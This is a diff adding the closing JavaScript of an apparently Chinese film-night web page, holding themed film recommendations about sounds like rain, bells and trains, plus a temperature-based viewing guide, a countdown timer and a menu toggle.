+  d:[["《修女艾达》","全片最长的对话不超过两句"],["《驾驶我的车》","后座的沉默比独白更久"],["《蓝色大门》","告白没说出口的那一段"]]},
+ {e:"镜 六",t:"食物的声音是助眠白噪音",p:"切菜、热油、汤滚。这些声音在两点钟比任何音乐都管用。",
+  d:[["《饮食男女》","开场六分钟是一道完整的菜"],["《小森林》","番茄罐头与萝卜的两种做法"],["《澄沙之味》","面粉飞起来的那一秒"]]},
+ {e:"镜 七",t:"钟声替你数时间",p:"教堂、车站、学校的钟。夜里看片听到钟声，会突然知道现在几点，也会知道片子过了多久。",
+  d:[["《天堂电影院》","老放映员留下的那盘胶卷"],["《修女艾达》","修道院的钟，一天三次"],["《海上钢琴师》","船上的钟和岸上的钟不是同一个"]]},
+ {e:"镜 八",t:"雨声比台词诚实",p:"有些片子你记不住情节，但记得住那场雨下了多久。雨的长度就是情绪的刻度。",
+  d:[["《堕落天使》","雨一直下到片尾"],["《无人知晓》","一把伞的距离"],["《花样年华》","烟和雨，都没点着"]]},
+ {e:"镜 九",t:"火车带走了什么",p:"夜里的火车声是片尾曲的一部分。人走了，铁轨还在响。",
+  d:[["《爱在黎明破晓前》","维也纳的夜车，只有一晚"],["《天堂电影院》","他坐火车离开，再没回来"],["《悲情城市》","车站广播用的是另一种语言"]]},
+ {e:"镜 十",t:"猫在哪一场出现",p:"夜里看片会发现，猫总在主角最想说话的时候出现。它不说话，但它是答案。",
+  d:[["《海街日记》","四姐妹收留的那只猫"],["《小森林》","雪地里走过来的一只"],["《恋爱回旋》","便利店门口一直没走的"]]}
+];
+var fi=0;
+function rF(){
+  var o=FL[fi];
+  document.getElementById('flE').textContent=o.e;
+  document.getElementById('flT').textContent=o.t;
+  document.getElementById('flP').textContent=o.p;
+  var h='';
+  o.d.forEach(function(x){h+='<div><dt>'+x[0]+'</dt><dd>'+x[1]+'</dd></div>'});
+  var box=document.getElementById('flR');
+  box.classList.remove('on');
+  setTimeout(function(){box.innerHTML='<h4>这一镜里要盯住的地方</h4><dl>'+h+'</dl>';box.classList.add('on')},150);
+}
+document.querySelectorAll('#flB b').forEach(function(b,i){b.addEventListener('click',function(){
+  document.querySelectorAll('#flB b').forEach(function(x){x.classList.remove('on')});b.classList.add('on');fi=i;rF();
+})});
+rF();
+
+/* 温度计 */
+var TMP=[
+ {t:"13℃ 以上",s:"薄外套就够 · 可走滨江长线",c:"适配 140 分钟以内的片子"},
+ {t:"8℃ — 12℃",s:"要穿外套 · 巷子线最舒服",c:"适配《海街日记》《情书》"},
+ {t:"3℃ — 7℃",s:"围巾带上 · 只走夜市后巷",c:"适配《饮食男女》《小森林》"},
+ {t:"0℃ — 2℃",s:"手套 · 阳台站三分钟就回",c:"适配助眠场，看完直接睡"},
+ {t:"零下",s:"别出门 · 把片子看两遍",c:"适配《南极之恋》《温蒂妮》"}
+];
+var tpL=document.getElementById('tmpL');
+TMP.forEach(function(o,i){
+  var li=document.createElement('li');
+  li.innerHTML='<b>'+o.t+'</b><span>'+o.s+' · '+o.c+'</span>';
+  li.onclick=function(){document.querySelectorAll('#tmpL li').forEach(function(x){x.classList.remove('on')});li.classList.add('on');document.getElementById('tp').textContent=(Math.random()*2+3).toFixed(1);};
+  if(i===2)li.classList.add('on');
+  tpL.appendChild(li);
+});
+
+/* 倒计时 */
+function cd(){
+  var n=new Date(),y=n.getFullYear(),m=n.getMonth();
+  var target=new Date(y,m+1,0,0,0,0);
+  var d=Math.floor((target-n)/86400000),h=Math.floor((target-n)%86400000/3600000),mm=Math.floor((target-n)%3600000/60000),s=Math.floor((target-n)%60000/1000);
+  document.getElementById('cd').textContent='距立冬换片 · 尚余 '+d+' 日 '+h+' 时 '+mm+' 分 '+s+' 秒';
+}
+cd();setInterval(cd,1000);
+
+/* 导航 */
+function tg(){document.getElementById('nv').classList.toggle('open')}
+</script>
+</body>
+</html>
